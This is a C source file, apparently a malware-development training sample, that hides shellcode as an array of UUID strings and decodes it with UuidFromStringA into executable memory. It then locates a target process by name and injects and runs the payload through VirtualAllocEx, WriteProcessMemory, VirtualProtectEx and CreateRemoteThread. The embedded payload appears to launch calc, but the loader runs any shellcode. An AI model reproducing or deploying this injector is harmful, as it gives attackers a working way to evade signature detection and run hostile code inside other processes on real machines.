#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

#define NumberOfElements 17

char* UuidArray[] = {
		"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
		"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
		"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
		"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
		"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF",
		"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C6300"
};

// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID* Uuid
	);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T		sBuffSize = NULL;

	RPC_STATUS 	STATUS = NULL;

	// Getting UuidFromStringA address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of UUID strings * 16
	sBuffSize = NmbrOfElements * 16;

	// Allocating memory which will hold the deobfuscated shellcode
	//pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the UUID strings saved in UuidArray
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one UUID string at a time
		// UuidArray[i] is a single UUID string from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// if it failed
			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;
}


/*
API functions used to perform process enumeration:

- CreateToolhelp32Snapshot: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot

- Process32First: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first

- Process32Next: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next

- OpenProcess: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

*/

// Gets the process handle of a process of name szProcessName
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	HANDLE			hSnapShot = NULL;
	PROCESSENTRY32	Proc = {
					.dwSize = sizeof(PROCESSENTRY32)
	};

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lowercase character and saving it
			// in LowerName to do the wcscmp call later

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// Compare the enumerated process path with what is passed
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the process ID 
			*dwProcessId = Proc.th32ProcessID;
			// Open a process handle and return
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Retrieves information about the next process recorded the snapshot.
		// while there is still a valid output ftom Process32Next, continue looping
	} while (Process32Next(hSnapShot, &Proc));



_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}




/*
API functions used to perform the code injection part:
- VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex

- WriteProcessMemory: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

- VirtualProtectEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex

- CreateRemoteThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
*/


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	PVOID	pShellcodeAddress = NULL;

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;

	// Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	// Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	// Cleaning the buffer of the shellcode in the local process
	memset(pShellcode, '\0', sSizeOfShellcode);

	// Setting memory permossions at pShellcodeAddress to be executable 
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Running the shellcode as a new thread's entry in the remote process
	printf("[#] Press <Enter> To Run ... ");
	getchar();
	printf("[i] Executing Payload ... ");
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE !\n");

	return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

	HANDLE		hProcess = NULL;
	DWORD		dwProcessId = NULL;

	PBYTE		pDeobfuscatedPayload = NULL;
	SIZE_T      sDeobfuscatedSize = NULL;

	// Checking command line arguments
	if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}
	// Getting a handle to the process
	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	wprintf(L"[+] DONE \n");
	printf("[i] Found Target Process Pid: %d \n", dwProcessId);

	printf("[#] Press <Enter> To Decrypt ... ");
	getchar();
	printf("[i] Decrypting ...");

	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		return -1;
	}

	printf("[+] DONE !\n");
	printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

	// Injecting the shellcode
	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
		return -1;
	}

	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	CloseHandle(hProcess);
	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}

